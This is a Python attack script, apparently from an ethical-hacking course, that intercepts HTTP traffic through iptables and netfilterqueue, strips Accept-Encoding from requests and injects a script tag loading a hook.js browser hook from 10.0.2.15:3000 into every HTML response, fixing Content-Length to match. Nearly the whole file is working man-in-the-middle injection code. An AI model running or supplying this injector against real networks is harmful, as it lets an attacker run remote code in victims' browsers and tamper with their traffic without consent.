#import libraries and modules
import subprocess
import optparse
import scapy.all as scapy
import re
import netfilterqueue

def get_args():
    '''
    Get command line arguments
    '''

    parser = optparse.OptionParser()
    parser.add_option("-o", "--packet-origin", dest="packet_origin", default="own",help="Origin of packets: can be 'own' or 'remote'")

    (options, _) = parser.parse_args()

    if (options.packet_origin != "own") and (options.packet_origin != "remote"):
        parser.error("[-] Specify the origin of the packets using '-o <own/remote>' or use '--help' for more info")
        quit()
    else:
        return options.packet_origin

def set_load(packet, load):
    packet[scapy.Raw].load = load  # redirects to another url / location

    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    # del scapy_packet[scapy.TCP].len #NOTE: TCP layer has no field named 'len', only UDP-layer like used in dns_spoof.py
    del packet[scapy.TCP].chksum

    return packet


def process_packet(packet):
    regex_enc = r"Accept-Encoding:.*?\\r\\n"  # '?' - means non-greedy --> this will stop after the FIRST occurence of the following expression (here: '\\r\\n'
    regex_cont_len = r"(?:Content-Length:\s)(\d*)"  #regex separated into 2 groups, wth the first group being a non-capturing group ('?:')
    scapy_packet = scapy.IP(packet.get_payload())  #draping the original packet into a scapy-IP-layer wil automatically convert it into a scapy packet
    if scapy_packet.haslayer(scapy.Raw):
        try:
            load = scapy_packet[scapy.Raw].load.decode()
            if scapy_packet[scapy.TCP].dport == 80:  #to use scapy to check for HTTP requests and responses, check the TCP-layer -this layer contains sport (=source-port) and dport (=destination-port); if the sport is an HTTP-port, then the package contains an HTTP-response
                print("[+] Request")
                load = re.sub(regex_enc, '', load)  # modify load: remove 'Accept-Encoding'-field from load, in order to get unencoded text to analyse it further

            elif scapy_packet[scapy.TCP].sport == 80:
                print("[+] Response")
                if "<body>" in load:
                    replce = "<body>"
                    replce_with = '<script src="http://10.0.2.15:3000/hook.js"></script><body>'
                    load = load.replace(replce, replce_with) # replace closing body tag with Javascript code injection
                    content_length_search = re.search(regex_cont_len, load)
                    if content_length_search and 'text/html' in load:    #.js or other webpaged do not have a body-tag --> change only made if page is html --> only re-calculate content length then
                        content_length = content_length_search.group(1)  #grab group 1 = the not non-capturing group
                        print(f'Length: {content_length}')
                        injection_code_len = len(replce_with) - len(replce) # here:replce_with-len minus original replce-len, as here the original string is contained in the new string
                        new_content_len = int(content_length) + injection_code_len
                        load = load.replace(content_length, str(new_content_len))
                        print(f'New Length: {re.search(regex_cont_len, load).group(1)}')

            else:
                pass

            if load != scapy_packet[scapy.Raw].load.decode():  #only run this if load was modified
                new_packet = set_load(scapy_packet, load)
                packet.set_payload(bytes(new_packet))
                print(">>> Response Packet: ", scapy_packet.show())

        except UnicodeDecodeError:
            pass

    packet.accept()

print("===================")
print("Starting Code Injector")
print("===================")

packet_origin = get_args()
#enable packet routing of Kali machine
subprocess.run(["echo", "1", ">", "/proc/sys/net/ipv4/ip_forward"])

if packet_origin == "remote":
    subprocess.call(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "666"])
elif packet_origin == "own":
    subprocess.call(["iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num", "666"])
    subprocess.call(["iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num", "777"])

try:
    queue = netfilterqueue.NetfilterQueue() # object that is going to interact with queue 666 created above
    queue.bind(666, process_packet) # binds variable 'queue' to 666 and executes a function on every packet in the queue
    queue.run()
except KeyboardInterrupt:
    print("Shutting down program...")
    print("Flushing IP Tables...")
    subprocess.run(["iptables","--flush"])
    subprocess.run(["echo", "0", ">", "/proc/sys/net/ipv4/ip_forward"])
    print("IP Tables successfully reset.")
    exit()

